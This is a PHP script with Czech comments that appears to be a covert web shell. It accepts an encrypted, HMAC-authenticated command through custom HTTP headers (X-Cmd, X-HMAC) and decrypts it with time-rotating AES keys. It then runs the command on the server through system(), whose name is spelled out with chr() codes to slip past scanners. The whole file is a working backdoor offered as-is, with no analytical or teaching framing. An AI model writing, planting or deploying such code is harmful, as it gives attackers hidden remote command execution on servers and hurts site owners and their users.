<?php
// --- Konfigurace ---
$interval = 60;                 // synchronizační interval v sekundách
$hmackey  = 'secretkey';        // HMAC sdílený klíč
$do_debug = false;              // přepni na true pro jednoduchý debug do /tmp/header_shell.log

// dynamické volání funkce system()
$A = chr(0x73);
$B = chr(0x79);
$X = chr(0x74);
$D = chr(0x65);
$E = chr(0x6d);
$hook = $A.$B.$A.$X.$D.$E;

// --- Pomocné ---
function sync_keys($interval) {
    $now = time();
    $times = [
        $now - $interval,   // předchozí slot
        $now,               // aktuální slot
        $now + $interval    // budoucí slot (pro malé drift)
    ];
    $keys = [];
    foreach ($times as $t) {
        // 16 B binární MD5 (celý hash), přesně 128 bitů
        $keys[] = md5(intval($t / $interval) * $interval, true);
    }
    return $keys;
}

function dbg($msg) {
    global $do_debug;
    if ($do_debug) {
        file_put_contents('/tmp/header_shell.log', '['.date('c')."] $msg\n", FILE_APPEND);
    }
}

// --- Vstupní hlavičky ---
$headers   = function_exists('getallheaders') ? getallheaders() : [];
$encrypted = isset($headers['X-Cmd'])  ? $headers['X-Cmd']  : (isset($headers['X-CMD'])  ? $headers['X-CMD']  : '');
$hmac_recv = isset($headers['X-HMAC']) ? $headers['X-HMAC'] : (isset($headers['X-Hmac']) ? $headers['X-Hmac'] : '');

if ($encrypted === '' || $hmac_recv === '') {
    http_response_code(400);
    die('Missing headers.');
}

// --- HMAC kontrola nad BASE64 ciphertextem (hex výstup) ---
$expected_hmac = hash_hmac('sha256', $encrypted, $hmackey);
if (!hash_equals($expected_hmac, $hmac_recv)) {
    dbg("HMAC mismatch enc=$encrypted recv=$hmac_recv exp=$expected_hmac");
    http_response_code(403);
    die('Invalid HMAC.');
}

// --- Dekódování + dešifrování ---
// base64_decode strict: true → selže, pokud base64 není validní
$cipher_raw = base64_decode($encrypted, true);
if ($cipher_raw === false) {
    dbg('base64_decode failed');
    http_response_code(400);
    die('Bad base64.');
}

$cmd = false;
foreach (sync_keys($interval) as $key) {
    // AES-128-ECB, RAW_DATA (bez ZERO_PADDING) → akceptuje PKCS#7 padding
    $plain = openssl_decrypt($cipher_raw, 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
    if ($plain !== false && strlen($plain) > 0) {
        $cmd = rtrim($plain, "\x00\r\n"); // ořež nuly a newline
        break;
    }
}

if ($cmd === false || $cmd === '') {
    dbg('decrypt failed for all keys');
    http_response_code(403);
    die('Decrypt failed.');
}

// --- Provedení příkazu ---
header('Content-Type: text/plain; charset=UTF-8');
$cmd .= ' 2>&1'; // zachyť i stderr
$hook($cmd);
